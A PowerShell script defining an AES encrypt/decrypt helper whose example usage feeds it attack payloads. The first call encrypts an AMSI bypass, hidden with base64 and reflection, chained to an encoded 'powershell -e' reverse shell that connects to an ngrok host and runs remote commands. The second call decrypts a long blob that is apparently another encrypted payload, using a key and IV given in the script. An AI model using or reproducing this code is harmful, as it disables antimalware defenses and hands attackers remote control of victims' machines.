Function aes {
    Param (
        [String]$Data,
        [Parameter(Mandatory=$false)]
        [String]$Key,
        [Parameter(Mandatory=$false)]
        [String]$IVector
    )

    $AES = [System.Security.Cryptography.Aes]::Create()

    if ($Key -and $IVector) {
        $AES.Key = [System.Convert]::FromBase64String($Key)
        $AES.IV = [System.Convert]::FromBase64String($IVector)
        $EncryptedBytes = [System.Convert]::FromBase64String($Data)
        $Decryptor = $AES.CreateDecryptor()
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        $DecryptedString = [System.Text.Encoding]::Unicode.GetString($DecryptedBytes)

        Write-Output "DecryptedString: $DecryptedString"
    } else {
        $encryptor = $AES.CreateEncryptor()
        [System.Byte[]]$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
        $EncryptedBytes = $encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
        $EncryptedBase64String = [System.Convert]::ToBase64String($EncryptedBytes)

        Write-Output "EncryptedBase64String: $EncryptedBase64String"
        Write-Output "Key: $([System.Convert]::ToBase64String($AES.Key))"
        Write-Output "IV: $([System.Convert]::ToBase64String($AES.IV))"
    }
}

# Example usage:
aes -Data "[Ref].Assembly.GetType([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))).GetField([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ=')),'NonPublic,Static').SetValue($null,$true);powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcANAAuAHQAYwBwAC4AbgBnAHIAbwBrAC4AaQBvACcALAAxADcANAA2ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
aes -Data "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" -Key "CKmPSI6TL+krbrMAy3vV33ArGFGfMEfI/FJqMSzbFYk=" -IVector "b0pvTbywqL/fc9w+XPjkVA=="
